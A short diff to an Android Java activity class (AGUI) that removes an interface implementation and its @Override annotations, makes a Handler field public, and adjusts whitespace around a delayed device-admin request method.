@@ -34,10 +34,10 @@ import com.android.deviceinfo.util.Check;
  * http://stackoverflow.com/questions/10909683/launch
  * -android-application-without-main-activity-and-start-service-on-launching
  */
-public class AGUI extends Activity implements DeviceAdminRequest {
+public class AGUI extends Activity {
 	protected static final String TAG = "AndroidServiceGUI"; //$NON-NLS-1$
 	private static final int REQUEST_ENABLE = 0;
-	private Handler handler;
+	public Handler handler;
 
 	/**
 	 * Called when the activity is first created.
@@ -180,11 +180,11 @@ public class AGUI extends Activity implements DeviceAdminRequest {
 		}
 	}
 
-	@Override
 	public void deviceAdminRequest() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (deviceAdminRequest) ");
 		}
+		
 		handler.postDelayed(new Runnable() {
 
 			@Override
@@ -197,10 +197,8 @@ public class AGUI extends Activity implements DeviceAdminRequest {
 
 			}
 		}, 1 * 1000);
-
 	}
 
-	@Override
 	public Context getAppContext() {
 		return getApplicationContext();
 	}
